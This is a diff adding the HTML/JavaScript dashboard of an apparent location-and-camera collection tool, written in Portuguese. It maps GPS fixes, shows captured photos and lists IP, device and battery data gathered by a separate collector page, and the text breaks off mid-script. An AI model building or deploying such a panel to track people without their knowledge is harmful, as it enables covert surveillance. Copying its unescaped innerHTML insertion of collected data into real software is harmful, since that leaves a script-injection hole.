@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Monitoramento & Telemetria em Tempo Real</title>
+    <!-- FontAwesome & Leaflet CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f1f5f9;
+            color: #1e293b;
+            min-height: 100vh;
+        }
+        
+        header {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: white;
+            padding: 20px 30px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+        }
+
+        .header-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        h1 {
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        h1 i {
+            color: #38bdf8;
+        }
+        
+        .subtitle {
+            font-size: 0.95rem;
+            color: #94a3b8;
+            margin-top: 4px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 25px;
+        }
+        
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .search-filter-bar {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            align-items: center;
+            width: 100%;
+            background: white;
+            padding: 12px 18px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            margin-bottom: 25px;
+        }
+
+        .search-box {
+            position: relative;
+            flex: 1;
+            min-width: 240px;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 9px 12px 9px 36px;
+            border-radius: 8px;
+            border: 1px solid #cbd5e1;
+            font-size: 0.9rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .search-box input:focus {
+            border-color: #0284c7;
+        }
+
+        .search-box i {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94a3b8;
+        }
+
+        .filter-select {
+            padding: 9px 14px;
+            border-radius: 8px;
+            border: 1px solid #cbd5e1;
+            background: white;
+            color: #334155;
+            font-size: 0.9rem;
+            cursor: pointer;
+            outline: none;
+        }
+        
+        .controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 10px 18px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.88rem;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+        }
+        
+        .btn-primary { background-color: #0284c7; color: white; }
+        .btn-primary:hover { background-color: #0369a1; }
+        
+        .btn-secondary { background-color: #475569; color: white; }
+        .btn-secondary:hover { background-color: #334155; }
+
+        .btn-danger { background-color: #ef4444; color: white; }
+        .btn-danger:hover { background-color: #dc2626; }
+        
+        .btn-success { background-color: #10b981; color: white; }
+        .btn-success:hover { background-color: #059669; }
+
+        .btn-outline {
+            background-color: transparent;
+            border: 1px solid #cbd5e1;
+            color: #475569;
+        }
+        .btn-outline:hover {
+            background-color: #f8fafc;
+            border-color: #94a3b8;
+        }
+        
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 18px;
+            margin-bottom: 25px;
+        }
+        
+        .stat-card {
+            background-color: white;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            border-top: 4px solid #0284c7;
+            transition: transform 0.25s ease, box-shadow 0.25s ease;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 18px rgba(0, 0, 0, 0.08);
+        }
+        
+        .stat-title {
+            color: #64748b;
+            font-size: 0.88rem;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
+        }
+        
+        .stat-value {
+            font-size: 2.1rem;
+            font-weight: 800;
+            color: #0f172a;
+        }
+        
+        .stat-change {
+            font-size: 0.8rem;
+            margin-top: 6px;
+            color: #64748b;
+        }
+        
+        .positive { color: #10b981; font-weight: 600; }
+        .negative { color: #ef4444; font-weight: 600; }
+
+        /* Grade com Mapa e Lista */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+        
+        .data-container {
+            background-color: white;
+            border-radius: 12px;
+            padding: 22px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+        
+        .data-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .data-title {
+            font-size: 1.25rem;
+            color: #0f172a;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .data-list {
+            max-height: 700px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            padding-right: 5px;
+        }
+        
+        .data-item {
+            padding: 18px;
+            border-radius: 10px;
+            background-color: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-left: 5px solid #0284c7;
+            transition: all 0.2s ease;
+        }
+        
+        .data-item:hover {
+            background-color: #f0f9ff;
+            border-color: #bae6fd;
+        }
+        
+        .data-item-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+            padding-bottom: 8px;
+            border-bottom: 1px dashed #cbd5e1;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .data-badge {
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.78rem;
+            color: white;
+            text-transform: uppercase;
+        }
+
+        .badge-gps { background-color: #10b981; }
+        .badge-photo { background-color: #8b5cf6; }
+        .badge-ip { background-color: #0284c7; }
+        
+        .session-id {
+            font-family: monospace;
+            background-color: #334155;
+            color: #f8fafc;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+        }
+        
+        .data-body-layout {
+            display: grid;
+            grid-template-columns: 140px 1fr;
+            gap: 18px;
+            align-items: start;
+        }
+
+        .data-thumbnail-wrapper {
+            width: 140px;
+            height: 105px;
+            border-radius: 8px;
+            overflow: hidden;
+            background-color: #0f172a;
+            position: relative;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .data-thumbnail-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.3s ease;
+        }
+
+        .data-thumbnail-wrapper:hover img {
+            transform: scale(1.08);
+        }
+
+        .thumbnail-zoom-hint {
+            position: absolute;
+            bottom: 4px;
+            right: 4px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.68rem;
+        }
+
+        .no-photo-box {
+            color: #64748b;
+            font-size: 0.75rem;
+            text-align: center;
+            padding: 10px;
+        }
+
+        .data-content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 12px;
+        }
+        
+        .data-field {
+            background-color: white;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            border: 1px solid #e2e8f0;
+            line-height: 1.45;
+        }
+        
+        .data-field strong {
+            color: #0f172a;
+            display: block;
+            margin-bottom: 4px;
+            font-size: 0.78rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .empty-data {
+            text-align: center;
+            padding: 50px 20px;
+            color: #64748b;
+        }
+        
+        .empty-data i {
+            font-size: 3.5rem;
+            margin-bottom: 15px;
+            opacity: 0.3;
+        }
+        
+        /* Container do Mapa */
+        .map-wrapper {
+            height: 420px;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid #e2e8f0;
+        }
+
+        #map {
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+        
+        .map-placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            color: #64748b;
+            background-color: #f8fafc;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 2;
+        }
+        
+        .realtime-badge {
+            background-color: #ef4444;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+
+        /* Modal Lightbox para Foto */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(15, 23, 42, 0.85);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 20px;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.25s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .modal-card {
+            background: white;
+            border-radius: 14px;
+            max-width: 700px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-header {
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .modal-body {
+            padding: 20px;
+            text-align: center;
+            background: #0f172a;
+        }
+
+        .modal-body img {
+            max-width: 100%;
+            max-height: 520px;
+            border-radius: 8px;
+            object-fit: contain;
+        }
+
+        .modal-footer {
+            padding: 14px 20px;
+            background: #f8fafc;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #e2e8f0;
+        }
+
+        /* Tela de Bloqueio por PIN */
+        .lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0f172a;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            padding: 20px;
+        }
+
+        .lock-box {
+            background: #1e293b;
+            padding: 35px 30px;
+            border-radius: 16px;
+            text-align: center;
+            max-width: 380px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            border: 1px solid #334155;
+        }
+
+        .lock-box input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #475569;
+            background: #0f172a;
+            color: white;
+            font-size: 1.1rem;
+            text-align: center;
+            letter-spacing: 4px;
+            margin: 20px 0;
+            outline: none;
+        }
+
+        .hidden { display: none !important; }
+
+        @media (max-width: 768px) {
+            .data-body-layout {
+                grid-template-columns: 1fr;
+            }
+            .data-thumbnail-wrapper {
+                width: 100%;
+                height: 180px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Tela de Bloqueio com PIN (Opcional) -->
+    <div id="lock-screen" class="lock-screen hidden">
+        <div class="lock-box">
+            <i class="fas fa-lock" style="font-size: 2.5rem; color: #38bdf8; margin-bottom: 12px;"></i>
+            <h2>Painel Protegido</h2>
+            <p style="color: #94a3b8; font-size: 0.88rem; margin-top: 6px;">Digite o PIN de 4 dígitos para acessar os registros.</p>
+            <input type="password" id="pin-input" maxlength="8" placeholder="••••" autocomplete="off">
+            <button id="unlock-btn" class="btn btn-primary" style="width: 100%; justify-content: center;">
+                <i class="fas fa-key"></i> Desbloquear
+            </button>
+            <p id="pin-error" style="color: #f87171; font-size: 0.8rem; margin-top: 10px;" class="hidden">PIN incorreto. Tente novamente.</p>
+        </div>
+    </div>
+
+    <!-- Modal Lightbox para Ampliar Foto -->
+    <div id="photo-modal" class="modal-overlay">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3 id="modal-title" style="font-size: 1.05rem; color: #0f172a;"><i class="fas fa-camera"></i> Foto em Alta Resolução</h3>
+                <button id="modal-close-btn" class="btn btn-outline" style="padding: 6px 12px;"><i class="fas fa-times"></i> Fechar</button>
+            </div>
+            <div class="modal-body">
+                <img id="modal-img" src="" alt="Snapshot capturado">
+            </div>
+            <div class="modal-footer">
+                <span id="modal-meta" style="font-size: 0.85rem; color: #64748b;">-</span>
+                <a id="modal-download-btn" class="btn btn-primary" download="coleta-foto.jpg">
+                    <i class="fas fa-download"></i> Baixar Imagem
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <header>
+        <div class="header-content">
+            <div>
+                <h1><i class="fas fa-satellite"></i> Centro de Monitoramento & Auditoria</h1>
+                <p class="subtitle">Supervisão em tempo real de geolocalização, fotos de câmera e telemetria de dispositivos</p>
+            </div>
+            <div class="controls">
+                <button id="lock-toggle-btn" class="btn btn-secondary">
+                    <i class="fas fa-lock"></i> <span id="lock-btn-label">Proteger com PIN</span>
+                </button>
+                <button id="open-collector-btn" class="btn btn-success">
+                    <i class="fas fa-external-link-alt"></i> Abrir Coletor
+                </button>
+            </div>
+        </div>
+    </header>
+    
+    <div class="container">
+        <!-- Barra de Controles e Filtros -->
+        <div class="search-filter-bar">
+            <div class="search-box">
+                <i class="fas fa-search"></i>
+                <input type="text" id="search-input" placeholder="Filtrar por IP, cidade, dispositivo ou ID de sessão...">
+            </div>
+            <select id="type-filter" class="filter-select">
+                <option value="all">Todos os Registros</option>
+                <option value="with-photo">Apenas com Foto</option>
+                <option value="with-gps">Apenas com GPS</option>
+            </select>
+            <button id="export-csv-btn" class="btn btn-outline">
+                <i class="fas fa-file-csv"></i> Exportar CSV
+            </button>
+            <button id="export-json-btn" class="btn btn-outline">
+                <i class="fas fa-file-code"></i> Exportar JSON
+            </button>
+            <button id="refresh-btn" class="btn btn-primary">
+                <i class="fas fa-sync-alt"></i> Atualizar
+            </button>
+            <button id="clear-btn" class="btn btn-danger">
+                <i class="fas fa-trash-alt"></i> Limpar Histórico
+            </button>
+        </div>
+
+        <!-- Indicadores (KPIs) -->
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-title"><i class="fas fa-database"></i> Total de Registros</div>
+                <div class="stat-value" id="total-collections">0</div>
+                <div class="stat-change"><span id="last-hour-change">0</span> na última hora</div>
+            </div>
+            
+            <div class="stat-card" style="border-top-color: #10b981;">
+                <div class="stat-title"><i class="fas fa-map-marker-alt"></i> Localizações GPS</div>
+                <div class="stat-value" id="location-count">0</div>
+                <div class="stat-change"><span id="location-percent">0%</span> com satélite</div>
+            </div>
+            
+            <div class="stat-card" style="border-top-color: #8b5cf6;">
+                <div class="stat-title"><i class="fas fa-camera"></i> Fotos Capturadas</div>
+                <div class="stat-value" id="camera-count">0</div>
+                <div class="stat-change"><span id="camera-percent">0%</span> do total</div>
+            </div>
+            
+            <div class="stat-card" style="border-top-color: #f59e0b;">
+                <div class="stat-title"><i class="fas fa-mobile-alt"></i> Sessões Únicas</div>
+                <div class="stat-value" id="unique-devices">0</div>
+                <div class="stat-change"><span id="sessions-count">0</span> ativas recentemente</div>
+            </div>
+        </div>
+
+        <div class="dashboard-grid">
+            <!-- Mapa Interativo Leaflet -->
+            <div class="data-container">
+                <div class="data-header">
+                    <h3 class="data-title"><i class="fas fa-map-marked-alt"></i> Mapa Geográfico de Coletas</h3>
+                    <div style="display: flex; gap: 10px; align-items: center;">
+                        <button id="center-map-btn" class="btn btn-outline" style="padding: 5px 12px; font-size: 0.8rem;">
+                            <i class="fas fa-expand"></i> Centralizar Pontos
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="map-wrapper">
+                    <div id="map-placeholder" class="map-placeholder">
+                        <i class="fas fa-globe-americas" style="font-size: 3rem; margin-bottom: 12px; opacity: 0.4;"></i>
+                        <p style="font-weight: 600;">Aguardando Coordenadas GPS...</p>
+                        <p style="font-size: 0.82rem; margin-top: 4px;">Execute uma coleta no <strong>coletor.html</strong> para plotar os marcadores.</p>
+                    </div>
+                    <div id="map"></div>
+                </div>
+            </div>
+
+            <!-- Lista Completa de Dados -->
+            <div class="data-container">
+                <div class="data-header">
+                    <h3 class="data-title"><i class="fas fa-stream"></i> Registros de Telemetria</h3>
+                    <div class="realtime-badge">
+                        <i class="fas fa-circle"></i> Sincronização Ativa
+                    </div>
+                </div>
+                
+                <div class="data-list" id="data-list">
+                    <div class="empty-data" id="empty-data">
+                        <i class="fas fa-inbox"></i>
+                        <h3>Nenhum registro encontrado</h3>
+                        <p>Abra o coletor para gerar dados de telemetria.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Leaflet.js CDN -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+    <script>
+        // Elementos do DOM
+        const dataList = document.getElementById('data-list');
+        const emptyData = document.getElementById('empty-data');
+        const searchInput = document.getElementById('search-input');
+        const typeFilter = document.getElementById('type-filter');
+        const refreshBtn = document.getElementById('refresh-btn');
+        const clearBtn = document.getElementById('clear-btn');
+        const openCollectorBtn = document.getElementById('open-collector-btn');
+        const exportCsvBtn = document.getElementById('export-csv-btn');
+        const exportJsonBtn = document.getElementById('export-json-btn');
+        const centerMapBtn = document.getElementById('center-map-btn');
+
+        // Modal Elements
+        const photoModal = document.getElementById('photo-modal');
+        const modalImg = document.getElementById('modal-img');
+        const modalTitle = document.getElementById('modal-title');
+        const modalMeta = document.getElementById('modal-meta');
+        const modalCloseBtn = document.getElementById('modal-close-btn');
+        const modalDownloadBtn = document.getElementById('modal-download-btn');
+
+        // Lock screen elements
+        const lockScreen = document.getElementById('lock-screen');
+        const lockToggleBtn = document.getElementById('lock-toggle-btn');
+        const lockBtnLabel = document.getElementById('lock-btn-label');
+        const pinInput = document.getElementById('pin-input');
+        const unlockBtn = document.getElementById('unlock-btn');
+        const pinError = document.getElementById('pin-error');
+
+        // Stat Elements
+        const totalCollectionsEl = document.getElementById('total-collections');
+        const locationCountEl = document.getElementById('location-count');
+        const cameraCountEl = document.getElementById('camera-count');
+        const uniqueDevicesEl = document.getElementById('unique-devices');
+        const lastHourChangeEl = document.getElementById('last-hour-change');
+        const locationPercentEl = document.getElementById('location-percent');
+        const cameraPercentEl = document.getElementById('camera-percent');
+        const sessionsCountEl = document.getElementById('sessions-count');
+
+        // Mapa Leaflet
+        let map = null;
+        let mapMarkersLayer = null;
+        let mapCirclesLayer = null;
+
+        // Estado dos Dados
+        let allData = [];
+        let autoRefreshInterval = null;
+
+        // 1. Inicialização do Mapa com Camadas Livres e Sem Marca d'Água (Google Maps & Esri)
+        function initMap() {
+            if (map) return;
+
+            // Camada Google Maps Ruas (Rápida, sem chave, ruas e avenidas completas)
+            const googleStreets = L.tileLayer('https://mt{s}.google.com/vt/lyrs=m&x={x}&y={y}&z={z}', {
+                maxZoom: 20,
+                subdomains: ['0', '1', '2', '3'],
+                attribution: '&copy; Google Maps'
+            });
+
+            // Camada Google Maps Satélite / Híbrido (Imagens reais com nomes de ruas e bairros)
+            const googleHybrid = L.tileLayer('https://mt{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
+                maxZoom: 20,
+                subdomains: ['0', '1', '2', '3'],
+                attribution: '&copy; Google Maps'
+            });
+
+            // Camada Esri World Street Map (Alternativa estável de cartografia limpa)
+            const esriStreets = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/{z}/{y}/{x}', {
+                maxZoom: 19,
+                attribution: 'Tiles &copy; Esri'
+            });
+
+            map = L.map('map', {
+                center: [-15.793889, -47.882778], // Centro do Brasil
+                zoom: 4,
+                zoomControl: true,
+                layers: [googleStreets] // Padrão: Google Maps Ruas
+            });
+
+            // Seletor no Canto Superior Direito
+            const baseMaps = {
+                "🗺️ Google Ruas": googleStreets,
+                "🛰️ Google Satélite / Híbrido": googleHybrid,
+                "🏙️ Esri Ruas": esriStreets
+            };
+
+            L.control.layers(baseMaps, null, { position: 'topright' }).addTo(map);
+
+            mapMarkersLayer = L.layerGroup().addTo(map);
+            mapCirclesLayer = L.layerGroup().addTo(map);
+        }
+
+        // 2. Atualizar Marcadores no Mapa
+        function updateMapPoints(dataItems) {
+            initMap();
+            mapMarkersLayer.clearLayers();
+            mapCirclesLayer.clearLayers();
+
+            const itemsWithGps = dataItems.filter(item => item.location && item.location.latitude && item.location.longitude);
+            const placeholder = document.getElementById('map-placeholder');
+
+            if (itemsWithGps.length === 0) {
+                placeholder.classList.remove('hidden');
+                return;
+            }
+
+            placeholder.classList.add('hidden');
+            const bounds = [];
+
+            itemsWithGps.forEach((item) => {
+                const lat = item.location.latitude;
+                const lng = item.location.longitude;
+                const acc = item.location.accuracy || 10;
+                bounds.push([lat, lng]);
+
+                // Círculo de precisão
+                L.circle([lat, lng], {
+                    radius: acc,
+                    color: '#0284c7',
+                    fillColor: '#38bdf8',
+                    fillOpacity: 0.18,
+                    weight: 1.5
+                }).addTo(mapCirclesLayer);
+
+                // Marcador
+                const marker = L.marker([lat, lng]).addTo(mapMarkersLayer);
+
+                // Conteúdo do Popup com miniatura se houver foto
+                const photoHtml = item.camera && item.camera.photo 
+                    ? `<div style="text-align:center; margin-top:6px;"><img src="${item.camera.photo}" style="width:120px; height:80px; object-fit:cover; border-radius:6px;"></div>`
+                    : '';
+
+                const ipText = item.telemetry && item.telemetry.ipInfo ? item.telemetry.ipInfo.ip : 'N/A';
+
+                marker.bindPopup(`
+                    <div style="font-size: 0.85rem; line-height: 1.4;">
+                        <strong style="color:#0284c7;"><i class="fas fa-map-marker-alt"></i> Coleta GPS</strong><br>
+                        <strong>Data:</strong> ${new Date(item.timestamp).toLocaleString('pt-BR')}<br>
+                        <strong>Precisão:</strong> ± ${acc.toFixed(1)} metros<br>
+                        <strong>IP:</strong> ${ipText}<br>
+                        ${photoHtml}
+                    </div>
+                `);
+            });
+
+            if (bounds.length > 0) {
+                map.fitBounds(bounds, { padding: [40, 40], maxZoom: 16 });
+                setTimeout(() => map.invalidateSize(), 200);
+            }
+        }
+
+        // 3. Carregar Dados (localStorage e API se disponível)
+        async function loadData() {
+            // Tenta obter via API se servidor estiver rodando
+            try {
+                const res = await fetch('/api/data');
+                if (res.ok) {
+                    const serverData = await res.json();
+                    if (Array.isArray(serverData) && serverData.length > 0) {
+                        allData = serverData;
+                        localStorage.setItem('panelData', JSON.stringify(serverData));
+                        renderAll();
+                        return;
+                    }
+                }
+            } catch (e) {
+                // Servidor não ativo, segue com localStorage
+            }
+
+            const stored = localStorage.getItem('panelData');
+            allData = stored ? JSON.parse(stored) : [];
+            renderAll();
+        }
+
+        function renderAll() {
+            updateStats();
+            renderFilteredList();
+        }
+
+        // 4. Estatísticas
+        function updateStats() {
+            totalCollectionsEl.textContent = allData.length;
+
+            const locs = allData.filter(d => d.location && d.location.latitude);
+            const cams = allData.filter(d => d.camera && (d.camera.photo || d.camera.cameraActive));
+
+            locationCountEl.textContent = locs.length;
+            cameraCountEl.textContent = cams.length;
+
+            locationPercentEl.textContent = allData.length > 0 ? `${Math.round((locs.length / allData.length) * 100)}%` : '0%';
+            cameraPercentEl.textContent = allData.length > 0 ? `${Math.round((cams.length / allData.length) * 100)}%` : '0%';
+
+            const uniqueSess = [...new Set(allData.map(d => d.sessionId))];
+            uniqueDevicesEl.textContent = uniqueSess.length;
+
+            const oneHourAgo = new Date(Date.now() - 3600000);
+            const recent = allData.filter(d => new Date(d.timestamp) > oneHourAgo);
+            lastHourChangeEl.textContent = recent.length;
+            lastHourChangeEl.className = recent.length > 0 ? 'positive' : 'stat-change';
+
+            const fiveMinAgo = new Date(Date.now() - 300000);
+            const activeSess = [...new Set(allData.filter(d => new Date(d.timestamp) > fiveMinAgo).map(d => d.sessionId))];
+            sessionsCountEl.textContent = activeSess.length;
+        }
+
+        // 5. Renderização da Lista Filtrada
+        function renderFilteredList() {
+            const query = searchInput.value.toLowerCase().trim();
+            const typeVal = typeFilter.value;
+
+            const filtered = allData.filter(item => {
+                // Filtro por tipo
+                if (typeVal === 'with-photo' && (!item.camera || !item.camera.photo)) return false;
+                if (typeVal === 'with-gps' && (!item.location || !item.location.latitude)) return false;
+
+                // Filtro por texto
+                if (!query) return true;
+
+                const sess = (item.sessionId || '').toLowerCase();
+                const ip = (item.telemetry?.ipInfo?.ip || '').toLowerCase();
+                const city = (item.telemetry?.ipInfo?.city || '').toLowerCase();
+                const platform = (item.telemetry?.device?.platform || '').toLowerCase();
+                const ua = (item.telemetry?.device?.userAgent || '').toLowerCase();
+
+                return sess.includes(query) || ip.includes(query) || city.includes(query) || platform.includes(query) || ua.includes(query);
+            });
+
+            // Atualiza o mapa com os itens visíveis
+            updateMapPoints(filtered);
+
+            dataList.innerHTML = '';
+
+            if (filtered.length === 0) {
+                emptyData.style.display = 'block';
+                return;
+            }
+
+            emptyData.style.display = 'none';
+
+            filtered.forEach(item => {
+                const el = document.createElement('div');
+                el.className = 'data-item';
+
+                // Badges
+                const hasPhoto = item.camera && item.camera.photo;
+                const hasGps = item.location && item.location.latitude;
+                const hasIp = item.telemetry && item.telemetry.ipInfo && item.telemetry.ipInfo.ip;
+
+                let badgesHtml = '';
+                if (hasGps) badgesHtml += '<span class="data-badge badge-gps"><i class="fas fa-satellite"></i> GPS Ativo</span> ';
+                if (hasPhoto) badgesHtml += '<span class="data-badge badge-photo"><i class="fas fa-camera"></i> Foto</span> ';
+                if (hasIp) badgesHtml += '<span class="data-badge badge-ip"><i class="fas fa-network-wired"></i> IP</span>';
+
+                // Foto ou Placeholder
+                let thumbnailHtml = `
+                    <div class="data-thumbnail-wrapper">
+                        <div class="no-photo-box">
+                            <i class="fas fa-camera-slash" style="font-size: 1.5rem; margin-bottom: 4px; opacity: 0.5;"></i>
+                            <p>Sem Foto</p>
+                        </div>
+                    </div>
+                `;
+
+                if (hasPhoto) {
+                    thumbnailHtml = `
+                        <div class="data-thumbnail-wrapper" onclick="openPhotoModal('${item.camera.photo}', '${new Date(item.timestamp).toLocaleString('pt-BR')}', '${item.camera.resolution || 'N/A'}')">
+                            <img src="${item.camera.photo}" alt="Snapshot">
+                            <span class="thumbnail-zoom-hint"><i class="fas fa-search-plus"></i> Ampliar</span>
+                        </div>
+                    `;
+                }
+
+                // Dados de Bateria e Rede
+                const battery = item.telemetry?.battery;
+                const network = item.telemetry?.network;
+                const ipInfo = item.telemetry?.ipInfo;
+                const device = item.telemetry?.device;
+
+                let batteryStr = 'N/A';
+                if (battery) {
+                    batteryStr = `${battery.level}% ${battery.charging ? '<i class="fas fa-bolt" style="color:#eab308;"></i> Carregando' : ''}`;
+                }
+
+                let networkStr = network ? `${network.effectiveType.toUpperCase()} (${network.downlink})` : 'N/A';
+
+                el.innerHTML = `
+                    <div class="data-item-header">
+                        <div>
+                            ${badgesHtml}
+                            <span class="session-id" style="margin-left: 8px;">${(item.sessionId || 'Sessão').substring(0, 16)}</span>
+                        </div>
+                        <div style="font-size: 0.85rem; color: #64748b;">
+                            <i class="far fa-clock"></i> ${new Date(item.timestamp).toLocaleString('pt-BR')}
+                        </div>
+                    </div>
+
+                    <div class="data-body-layout">
+                        ${thumbnailHtml}
+                        <div class="data-content-grid">
+                            <div class="data-field">
+                                <strong><i class="fas fa-map-marker-alt"></i> Localização GPS</strong>
+                                ${hasGps ? `
+                                    Lat: ${item.location.latitude.toFixed(5)}, Lng: ${item.location.longitude.toFixed(5)}<br>
+                                    Precisão: <strong>± ${item.location.accuracy ? item.location.accuracy.toFixed(1) + ' m' : 'N/A'}</strong>
+                                ` : '<span style="color:#94a3b8;">Não permitida ou indisponível</span>'}
+                            </div>
+
+                            <div class="data-field">
+                                <strong><i class="fas fa-globe"></i> IP & Provedor</strong>
+                                ${ipInfo ? `
+                                    IP: <strong>${ipInfo.ip}</strong><br>
+                                    ${ipInfo.city || 'Cidade N/D'}, ${ipInfo.region || ''} (${ipInfo.country || ''})<br>
+                                    Org: ${ipInfo.org ? ipInfo.org.substring(0, 25) : 'N/A'}
+                                ` : '<span style="color:#94a3b8;">Telemetria de IP não disponível</span>'}
+                            </div>
+
+                            <div class="data-field">
+                                <strong><i class="fas fa-mobile-alt"></i> Dispositivo & Hardware</strong>
+                                SO / Plataforma: <strong>${device?.platform || 'N/A'}</strong><br>
+                                Tela: ${device?.screenResolution || 'N/A'} | Idioma: ${device?.language || 'N/A'}
+                            </div>
+
+                            <div class="data-field">
+                                <strong><i class="fas fa-bolt"></i> Bateria & Conexão</strong>
+                                Bateria: <strong>${batteryStr}</strong><br>
+                                Conexão: <strong>${networkStr}</strong>
+                            </div>
+                        </div>
+                    </div>
+                `;
+
+                dataList.appendChild(el);
+            });
+        }
+
+        // 6. Modal Lightbox
+        window.openPhotoModal = function(photoUrl, timestamp, resolution) {
+            modalImg.src = photoUrl;
+            modalMeta.textContent = `Capturado em: ${timestamp} | Resolução: ${resolution}`;
+            modalDownloadBtn.href = photoUrl;
+            modalDownloadBtn.download = `coleta_${Date.now()}.jpg`;
+            photoModal.classList.add('active');
+        };
+
+        modalCloseBtn.addEventListener('click', () => photoModal.classList.remove('active'));
+        photoModal.addEventListener('click', (e) => {
+            if (e.target === photoModal) photoModal.classList.remove('active');
+        });
+
+        // 7. Exportações (CSV e JSON)
+        exportJsonBtn.addEventListener('click', () => {
+            if (allData.length === 0) {
+                alert('Nenhum dado para exportar.');
+                return;
+            }
